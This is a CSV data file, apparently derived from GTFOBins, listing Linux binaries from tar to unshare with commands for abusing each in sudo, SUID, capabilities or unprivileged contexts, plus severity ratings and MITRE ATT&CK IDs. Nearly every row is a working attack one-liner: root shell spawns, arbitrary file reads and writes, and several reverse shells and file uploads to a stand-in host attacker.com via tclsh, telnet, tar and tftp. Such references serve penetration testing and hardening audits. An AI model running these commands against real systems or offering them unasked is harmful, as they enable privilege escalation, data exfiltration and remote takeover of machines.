1793,Linux,"tar xf /dev/null -I '/bin/sh -c ""/bin/sh 0<&2 1>&2""'",Abuse the 'tar' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/tar/
1794,Linux,"tar xf /dev/null -I '/bin/sh -c ""/bin/sh 0<&2 1>&2""'",Abuse the 'tar' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/tar/
1795,Linux,"tar xf /dev/null -I '/bin/sh -c ""/bin/sh 0<&2 1>&2""'",Abuse the 'tar' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/tar/
1796,Linux,echo '/bin/sh 0<&1' >/path/to/temp-file tar cf /path/to/temp-file.tar /path/to/temp-file tar xf /path/to/temp-file.tar --to-command /bin/sh,Abuse the 'tar' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions. The archive can also be prepared offline then uploaded to the target.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/tar/
1797,Linux,echo '/bin/sh 0<&1' >/path/to/temp-file tar cf /path/to/temp-file.tar /path/to/temp-file tar xf /path/to/temp-file.tar --to-command /bin/sh,Abuse the 'tar' binary (shell) in a suid context to escalate privileges or execute arbitrary actions. The archive can also be prepared offline then uploaded to the target.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/tar/
1798,Linux,echo '/bin/sh 0<&1' >/path/to/temp-file tar cf /path/to/temp-file.tar /path/to/temp-file tar xf /path/to/temp-file.tar --to-command /bin/sh,Abuse the 'tar' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions. The archive can also be prepared offline then uploaded to the target.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/tar/
1799,Linux,tar cvf user@attacker.com:/path/to/output-file /path/to/input-file --rsh-command=/bin/ssh,Abuse the 'tar' binary (upload) in a sudo context to escalate privileges or execute arbitrary actions. The attacker box must have the `rmt` utility installed.,Sudo Misconfiguration,High,T1548.003,https://gtfobins.github.io/gtfobins/tar/
1800,Linux,tar cvf user@attacker.com:/path/to/output-file /path/to/input-file --rsh-command=/bin/ssh,Abuse the 'tar' binary (upload) in a suid context to escalate privileges or execute arbitrary actions. The attacker box must have the `rmt` utility installed.,SUID Binaries,High,T1548.001,https://gtfobins.github.io/gtfobins/tar/
1801,Linux,tar cvf user@attacker.com:/path/to/output-file /path/to/input-file --rsh-command=/bin/ssh,Abuse the 'tar' binary (upload) in a unprivileged context to escalate privileges or execute arbitrary actions. The attacker box must have the `rmt` utility installed.,File Upload,Medium,T1105,https://gtfobins.github.io/gtfobins/tar/
1802,Linux,task execute /bin/sh,Abuse the 'task' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/task/
1803,Linux,task execute /bin/sh,Abuse the 'task' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/task/
1804,Linux,task execute /bin/sh,Abuse the 'task' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/task/
1805,Linux,taskset 1 /bin/sh,Abuse the 'taskset' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/taskset/
1806,Linux,taskset 1 /bin/sh,Abuse the 'taskset' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/taskset/
1807,Linux,tasksh !/bin/sh,Abuse the 'tasksh' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/tasksh/
1808,Linux,tasksh !/bin/sh,Abuse the 'tasksh' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/tasksh/
1809,Linux,tasksh !/bin/sh,Abuse the 'tasksh' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/tasksh/
1810,Linux,tbl /path/to/input-file,Abuse the 'tbl' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions. The read file content is corrupted by additional text at the beginning.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/tbl/
1811,Linux,tbl /path/to/input-file,Abuse the 'tbl' binary (file read) in a suid context to escalate privileges or execute arbitrary actions. The read file content is corrupted by additional text at the beginning.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/tbl/
1812,Linux,tbl /path/to/input-file,Abuse the 'tbl' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions. The read file content is corrupted by additional text at the beginning.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/tbl/
1813,Linux,tclsh load /path/to/lib.so x,Abuse the 'tclsh' binary (library load) in a capabilities context to escalate privileges or execute arbitrary actions.,Capabilities Abuse,High,T1548.001,https://gtfobins.github.io/gtfobins/tclsh/
1814,Linux,tclsh load /path/to/lib.so x,Abuse the 'tclsh' binary (library load) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,High,T1548.003,https://gtfobins.github.io/gtfobins/tclsh/
1815,Linux,tclsh load /path/to/lib.so x,Abuse the 'tclsh' binary (library load) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,High,T1548.001,https://gtfobins.github.io/gtfobins/tclsh/
1816,Linux,tclsh load /path/to/lib.so x,Abuse the 'tclsh' binary (library load) in a unprivileged context to escalate privileges or execute arbitrary actions.,Library Load Hijack,Medium,T1574.006,https://gtfobins.github.io/gtfobins/tclsh/
1817,Linux,"tclsh set s [socket attacker.com 12345];while 1 { puts -nonewline $s ""> "";flush $s;gets $s c;set e ""exec $c"";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;",Abuse the 'tclsh' binary (reverse shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/tclsh/
1818,Linux,"tclsh set s [socket attacker.com 12345];while 1 { puts -nonewline $s ""> "";flush $s;gets $s c;set e ""exec $c"";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;",Abuse the 'tclsh' binary (reverse shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/tclsh/
1819,Linux,"tclsh set s [socket attacker.com 12345];while 1 { puts -nonewline $s ""> "";flush $s;gets $s c;set e ""exec $c"";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;",Abuse the 'tclsh' binary (reverse shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Reverse Shell,High,T1059,https://gtfobins.github.io/gtfobins/tclsh/
1820,Linux,tclsh,Abuse the 'tclsh' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/tclsh/
1821,Linux,tclsh,Abuse the 'tclsh' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/tclsh/
1822,Linux,tclsh,Abuse the 'tclsh' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/tclsh/
1823,Linux,echo /path/to/command >/path/to/temp-file chmod +x /path/to/temp-file tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z /path/to/temp-file -Z root,Abuse the 'tcpdump' binary (command) in a sudo context to escalate privileges or execute arbitrary actions. This requires some traffic to be actually captured. Also note that the subprocess is immediately sent to the background.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/tcpdump/
1824,Linux,echo /path/to/command >/path/to/temp-file chmod +x /path/to/temp-file tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z /path/to/temp-file,Abuse the 'tcpdump' binary (command) in a unprivileged context to escalate privileges or execute arbitrary actions. This requires some traffic to be actually captured. Also note that the subprocess is immediately sent to the background.,Arbitrary Command Execution,High,T1059,https://gtfobins.github.io/gtfobins/tcpdump/
1825,Linux,tcpdump -ln -i lo -w 'command-argument' -W 1 -G 1 -z /path/to/command,"Abuse the 'tcpdump' binary (command) in a sudo context to escalate privileges or execute arbitrary actions. This require some traffic to be actually captured. Also note that the `command-argument` string is both passed to the command and written as file, hence some restrictions apply.",Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/tcpdump/
1826,Linux,tcpdump -ln -i lo -w 'command-argument' -W 1 -G 1 -z /path/to/command,"Abuse the 'tcpdump' binary (command) in a unprivileged context to escalate privileges or execute arbitrary actions. This require some traffic to be actually captured. Also note that the `command-argument` string is both passed to the command and written as file, hence some restrictions apply.",Arbitrary Command Execution,High,T1059,https://gtfobins.github.io/gtfobins/tcpdump/
1827,Linux,tcpdump -ln -i lo -w /path/to/output-file -c 1 -Z user,"Abuse the 'tcpdump' binary (file write) in a sudo context to escalate privileges or execute arbitrary actions. This saves the packet dump (count is 1) from the loopback interface to a file. To trigger the capture use something like: ``` nc -u localhost 1 <<<DATA ``` While `user` is the owner of the packet dump file, the invoking user must be able to capture traffic on the device.",Sudo Misconfiguration,High,T1548.003,https://gtfobins.github.io/gtfobins/tcpdump/
1828,Linux,tcpdump -ln -i lo -w /path/to/output-file -c 1 -Z user,"Abuse the 'tcpdump' binary (file write) in a suid context to escalate privileges or execute arbitrary actions. This saves the packet dump (count is 1) from the loopback interface to a file. To trigger the capture use something like: ``` nc -u localhost 1 <<<DATA ``` While `user` is the owner of the packet dump file, the invoking user must be able to capture traffic on the device.",SUID Binaries,High,T1548.001,https://gtfobins.github.io/gtfobins/tcpdump/
1829,Linux,tcpdump -ln -i lo -w /path/to/output-file -c 1 -Z user,"Abuse the 'tcpdump' binary (file write) in a unprivileged context to escalate privileges or execute arbitrary actions. This saves the packet dump (count is 1) from the loopback interface to a file. To trigger the capture use something like: ``` nc -u localhost 1 <<<DATA ``` While `user` is the owner of the packet dump file, the invoking user must be able to capture traffic on the device.",Arbitrary File Write,Medium,T1222,https://gtfobins.github.io/gtfobins/tcpdump/
1830,Linux,tcsh -c 'echo DATA >/path/to/output-file',Abuse the 'tcsh' binary (file write) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,High,T1548.003,https://gtfobins.github.io/gtfobins/tcsh/
1831,Linux,tcsh -bc 'echo DATA >/path/to/output-file',Abuse the 'tcsh' binary (file write) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,High,T1548.001,https://gtfobins.github.io/gtfobins/tcsh/
1832,Linux,tcsh -c 'echo DATA >/path/to/output-file',Abuse the 'tcsh' binary (file write) in a unprivileged context to escalate privileges or execute arbitrary actions.,Arbitrary File Write,Medium,T1222,https://gtfobins.github.io/gtfobins/tcsh/
1833,Linux,tcsh,Abuse the 'tcsh' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/tcsh/
1834,Linux,tcsh -b,Abuse the 'tcsh' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/tcsh/
1835,Linux,tcsh,Abuse the 'tcsh' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/tcsh/
1836,Linux,tdbtool ! /bin/sh,Abuse the 'tdbtool' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/tdbtool/
1837,Linux,tdbtool ! /bin/sh,Abuse the 'tdbtool' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/tdbtool/
1838,Linux,tdbtool ! /bin/sh,Abuse the 'tdbtool' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/tdbtool/
1839,Linux,echo DATA | tee /path/to/output-file,Abuse the 'tee' binary (file write) in a sudo context to escalate privileges or execute arbitrary actions. Use `-a` to append data to exising files.,Sudo Misconfiguration,High,T1548.003,https://gtfobins.github.io/gtfobins/tee/
1840,Linux,echo DATA | tee /path/to/output-file,Abuse the 'tee' binary (file write) in a suid context to escalate privileges or execute arbitrary actions. Use `-a` to append data to exising files.,SUID Binaries,High,T1548.001,https://gtfobins.github.io/gtfobins/tee/
1841,Linux,echo DATA | tee /path/to/output-file,Abuse the 'tee' binary (file write) in a unprivileged context to escalate privileges or execute arbitrary actions. Use `-a` to append data to exising files.,Arbitrary File Write,Medium,T1222,https://gtfobins.github.io/gtfobins/tee/
1842,Linux,mkfifo /path/to/temp-socket telnet attacker.com 12345 </path/to/temp-socket | /bin/sh >/path/to/temp-socket,Abuse the 'telnet' binary (reverse shell) in a sudo context to escalate privileges or execute arbitrary actions. The shell process is not spawn by `openssl`.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/telnet/
1843,Linux,mkfifo /path/to/temp-socket telnet attacker.com 12345 </path/to/temp-socket | /bin/sh >/path/to/temp-socket,Abuse the 'telnet' binary (reverse shell) in a suid context to escalate privileges or execute arbitrary actions. The shell process is not spawn by `openssl`.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/telnet/
1844,Linux,mkfifo /path/to/temp-socket telnet attacker.com 12345 </path/to/temp-socket | /bin/sh >/path/to/temp-socket,Abuse the 'telnet' binary (reverse shell) in a unprivileged context to escalate privileges or execute arbitrary actions. The shell process is not spawn by `openssl`.,Reverse Shell,High,T1059,https://gtfobins.github.io/gtfobins/telnet/
1845,Linux,telnet !/bin/sh,Abuse the 'telnet' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/telnet/
1846,Linux,telnet !/bin/sh,Abuse the 'telnet' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/telnet/
1847,Linux,telnet !/bin/sh,Abuse the 'telnet' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/telnet/
1848,Linux,"terraform console file(""/path/to/input-file"")",Abuse the 'terraform' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/terraform/
1849,Linux,"terraform console file(""/path/to/input-file"")",Abuse the 'terraform' binary (file read) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/terraform/
1850,Linux,"terraform console file(""/path/to/input-file"")",Abuse the 'terraform' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/terraform/
1851,Linux,tex --shell-escape '\immediate\write18{/bin/sh}',Abuse the 'tex' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/tex/
1852,Linux,tex --shell-escape '\immediate\write18{/bin/sh}',Abuse the 'tex' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/tex/
1853,Linux,tex --shell-escape '\immediate\write18{/bin/sh}',Abuse the 'tex' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/tex/
1854,Linux,tftp attacker.com get /path/to/input-file,Abuse the 'tftp' binary (download) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/tftp/
1855,Linux,tftp attacker.com get /path/to/input-file,Abuse the 'tftp' binary (download) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/tftp/
1856,Linux,tftp attacker.com get /path/to/input-file,Abuse the 'tftp' binary (download) in a unprivileged context to escalate privileges or execute arbitrary actions.,File Download,Low,T1105,https://gtfobins.github.io/gtfobins/tftp/
1857,Linux,tftp attacker.com put /path/to/input-file,Abuse the 'tftp' binary (upload) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,High,T1548.003,https://gtfobins.github.io/gtfobins/tftp/
1858,Linux,tftp attacker.com put /path/to/input-file,Abuse the 'tftp' binary (upload) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,High,T1548.001,https://gtfobins.github.io/gtfobins/tftp/
1859,Linux,tftp attacker.com put /path/to/input-file,Abuse the 'tftp' binary (upload) in a unprivileged context to escalate privileges or execute arbitrary actions.,File Upload,Medium,T1105,https://gtfobins.github.io/gtfobins/tftp/
1860,Linux,tic -C /path/to/input-file,Abuse the 'tic' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions. This translates a terminfo file from source format into compiled format. It will attempt to translate an arbitrary file and output the contents of the file on failure.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/tic/
1861,Linux,tic -C /path/to/input-file,Abuse the 'tic' binary (file read) in a suid context to escalate privileges or execute arbitrary actions. This translates a terminfo file from source format into compiled format. It will attempt to translate an arbitrary file and output the contents of the file on failure.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/tic/
1862,Linux,tic -C /path/to/input-file,Abuse the 'tic' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions. This translates a terminfo file from source format into compiled format. It will attempt to translate an arbitrary file and output the contents of the file on failure.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/tic/
1863,Linux,time /bin/sh,"Abuse the 'time' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions. Note that the shell might have its own builtin `time` implementation, which may behave differently than the binary, which is often located at `/usr/bin/time`.",Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/time/
1864,Linux,time /bin/sh -p,"Abuse the 'time' binary (shell) in a suid context to escalate privileges or execute arbitrary actions. Note that the shell might have its own builtin `time` implementation, which may behave differently than the binary, which is often located at `/usr/bin/time`.",SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/time/
1865,Linux,time /bin/sh,"Abuse the 'time' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions. Note that the shell might have its own builtin `time` implementation, which may behave differently than the binary, which is often located at `/usr/bin/time`.",Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/time/
1866,Linux,timedatectl list-timezones,Abuse the 'timedatectl' binary (inherit) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/timedatectl/
1867,Linux,timedatectl list-timezones,Abuse the 'timedatectl' binary (inherit) in a unprivileged context to escalate privileges or execute arbitrary actions.,Privilege Inheritance,Low,T1548,https://gtfobins.github.io/gtfobins/timedatectl/
1868,Linux,timeout 0 /bin/sh,Abuse the 'timeout' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/timeout/
1869,Linux,timeout 0 /bin/sh -p,Abuse the 'timeout' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/timeout/
1870,Linux,timeout 0 /bin/sh,Abuse the 'timeout' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/timeout/
1871,Linux,tmate -c /bin/sh,Abuse the 'tmate' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/tmate/
1872,Linux,tmate -c /bin/sh,Abuse the 'tmate' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/tmate/
1873,Linux,tmate -c /bin/sh,Abuse the 'tmate' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/tmate/
1874,Linux,tmux -f /path/to/input-file,"Abuse the 'tmux' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions. The file is read and parsed as a `tmux` configuration file, part of the first invalid line is returned in an error message.",Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/tmux/
1875,Linux,tmux -f /path/to/input-file,"Abuse the 'tmux' binary (file read) in a suid context to escalate privileges or execute arbitrary actions. The file is read and parsed as a `tmux` configuration file, part of the first invalid line is returned in an error message.",SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/tmux/
1876,Linux,tmux -f /path/to/input-file,"Abuse the 'tmux' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions. The file is read and parsed as a `tmux` configuration file, part of the first invalid line is returned in an error message.",Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/tmux/
1877,Linux,tmux -c /bin/sh,Abuse the 'tmux' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/tmux/
1878,Linux,tmux -c /bin/sh,Abuse the 'tmux' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/tmux/
1879,Linux,tmux -c /bin/sh,Abuse the 'tmux' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/tmux/
1880,Linux,tmux -S /path/to/socket,"Abuse the 'tmux' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions. Provided to have enough permissions to access the socket (e.g., `/tmp/tmux-xxx/default`).",Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/tmux/
1881,Linux,tmux -S /path/to/socket,"Abuse the 'tmux' binary (shell) in a suid context to escalate privileges or execute arbitrary actions. Provided to have enough permissions to access the socket (e.g., `/tmp/tmux-xxx/default`).",SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/tmux/
1882,Linux,tmux -S /path/to/socket,"Abuse the 'tmux' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions. Provided to have enough permissions to access the socket (e.g., `/tmp/tmux-xxx/default`).",Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/tmux/
1883,Linux,echo -e 'pipe\tx\texec /bin/sh 1>&0 2>&0' >>~/.config/procps/toprc top # press return twice reset,Abuse the 'top' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions. The config path might be different.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/top/
1884,Linux,echo -e 'pipe\tx\texec /bin/sh 1>&0 2>&0' >>~/.config/procps/toprc top # press return twice reset,Abuse the 'top' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions. The config path might be different.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/top/
1885,Linux,torify /bin/sh,Abuse the 'torify' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/torify/
1886,Linux,torify /bin/sh,Abuse the 'torify' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/torify/
1887,Linux,torsocks /bin/sh,Abuse the 'torsocks' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/torsocks/
1888,Linux,torsocks /bin/sh,Abuse the 'torsocks' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/torsocks/
1889,Linux,troff /path/to/input-file,"Abuse the 'troff' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions. The file is typeset but text is still readable in the output, alternatively the output can be read with `man -l`.",Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/troff/
1890,Linux,troff /path/to/input-file,"Abuse the 'troff' binary (file read) in a suid context to escalate privileges or execute arbitrary actions. The file is typeset but text is still readable in the output, alternatively the output can be read with `man -l`.",SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/troff/
1891,Linux,troff /path/to/input-file,"Abuse the 'troff' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions. The file is typeset but text is still readable in the output, alternatively the output can be read with `man -l`.",Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/troff/
1892,Linux,tsc /path/to/input-file.ts,"Abuse the 'tsc' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions. Content is leaked as error messages. The file extension must be one of the supported ones, e.g., `.ts`, `.tsx`, etc.",Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/tsc/
1893,Linux,tsc /path/to/input-file.ts,"Abuse the 'tsc' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions. Content is leaked as error messages. The file extension must be one of the supported ones, e.g., `.ts`, `.tsx`, etc.",Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/tsc/
1894,Linux,tsc /path/to/input-file.ts --outFile /path/to/output-file,"Abuse the 'tsc' binary (file write) in a sudo context to escalate privileges or execute arbitrary actions. Content is leaked as error messages and written to file. The file extension must be one of the supported ones, e.g., `.ts`, `.tsx`, etc.",Sudo Misconfiguration,High,T1548.003,https://gtfobins.github.io/gtfobins/tsc/
1895,Linux,tsc /path/to/input-file.ts --outFile /path/to/output-file,"Abuse the 'tsc' binary (file write) in a unprivileged context to escalate privileges or execute arbitrary actions. Content is leaked as error messages and written to file. The file extension must be one of the supported ones, e.g., `.ts`, `.tsx`, etc.",Arbitrary File Write,Medium,T1222,https://gtfobins.github.io/gtfobins/tsc/
1896,Linux,echo '...' >/path/to/temp-file tshark -Xlua_script:/path/to/temp-file,Abuse the 'tshark' binary (inherit) in a sudo context to escalate privileges or execute arbitrary actions. This allows to run Lua code (`...`).,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/tshark/
1897,Linux,echo '...' >/path/to/temp-file tshark -Xlua_script:/path/to/temp-file,Abuse the 'tshark' binary (inherit) in a unprivileged context to escalate privileges or execute arbitrary actions. This allows to run Lua code (`...`).,Privilege Inheritance,Low,T1548,https://gtfobins.github.io/gtfobins/tshark/
1898,Linux,ul /path/to/input-file,Abuse the 'ul' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions. The read file content is corrupted by replacing occurrences of `$'\b_'` to terminal sequences and by converting tabs to spaces.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/ul/
1899,Linux,ul /path/to/input-file,Abuse the 'ul' binary (file read) in a suid context to escalate privileges or execute arbitrary actions. The read file content is corrupted by replacing occurrences of `$'\b_'` to terminal sequences and by converting tabs to spaces.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/ul/
1900,Linux,ul /path/to/input-file,Abuse the 'ul' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions. The read file content is corrupted by replacing occurrences of `$'\b_'` to terminal sequences and by converting tabs to spaces.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/ul/
1901,Linux,unexpand -t999 /path/to/input-file,"Abuse the 'unexpand' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions. Convert sequences of (e.g., `999`) spaces to tab.",Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/unexpand/
1902,Linux,unexpand -t999 /path/to/input-file,"Abuse the 'unexpand' binary (file read) in a suid context to escalate privileges or execute arbitrary actions. Convert sequences of (e.g., `999`) spaces to tab.",SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/unexpand/
1903,Linux,unexpand -t999 /path/to/input-file,"Abuse the 'unexpand' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions. Convert sequences of (e.g., `999`) spaces to tab.",Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/unexpand/
1904,Linux,uniq /path/to/input-file,Abuse the 'uniq' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions. The read file content is corrupted by squashing multiple adjacent lines.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/uniq/
1905,Linux,uniq /path/to/input-file,Abuse the 'uniq' binary (file read) in a suid context to escalate privileges or execute arbitrary actions. The read file content is corrupted by squashing multiple adjacent lines.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/uniq/
1906,Linux,uniq /path/to/input-file,Abuse the 'uniq' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions. The read file content is corrupted by squashing multiple adjacent lines.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/uniq/
1907,Linux,unshare /bin/sh,Abuse the 'unshare' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/unshare/
